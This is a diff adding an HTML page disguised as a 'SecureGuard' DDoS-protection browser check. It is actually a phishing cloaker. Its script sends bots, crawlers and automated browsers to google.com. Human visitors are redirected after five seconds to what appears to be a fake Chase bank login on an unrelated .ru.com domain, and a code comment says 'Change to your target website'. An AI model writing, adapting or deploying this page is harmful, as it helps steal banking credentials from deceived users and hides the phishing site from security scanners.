@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Just a Moment...</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f4f4;
+            text-align: center;
+        }
+
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 15px;
+            color: #333;
+        }
+
+        p {
+            font-size: 18px;
+            color: #666;
+        }
+
+        .loading-dots {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .dot {
+            width: 15px;
+            height: 15px;
+            margin: 0 5px;
+            background-color: #3498db;
+            border-radius: 50%;
+            animation: blink 1.5s infinite;
+        }
+
+        .dot:nth-child(2) {
+            animation-delay: 0.3s;
+        }
+
+        .dot:nth-child(3) {
+            animation-delay: 0.6s;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
+
+        .footer {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Checking Your Browser...</h1>
+        <p>This process is automatic. Please wait...</p>
+        
+        <div class="loading-dots">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+        
+        <p>You will be redirected shortly.</p>
+        
+        <div class="footer">
+            <p>DDoS protection by <strong>SecureGuard</strong></p>
+        </div>
+    </div>
+
+    <script>
+        function isBot() {
+            return navigator.webdriver || 
+                   /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent) || 
+                   !window.navigator.language;
+        }
+
+        function checkBot() {
+            if (isBot()) {
+                window.location.href = "https://www.google.com";
+            } else {
+                setTimeout(() => {
+                    window.location.href = "https://juno.ru.com/secure/CHASE/login.php"; // Change to your target website
+                }, 5000);
+            }
+        }
+
+        checkBot();
+    </script>
+</body>
+</html>
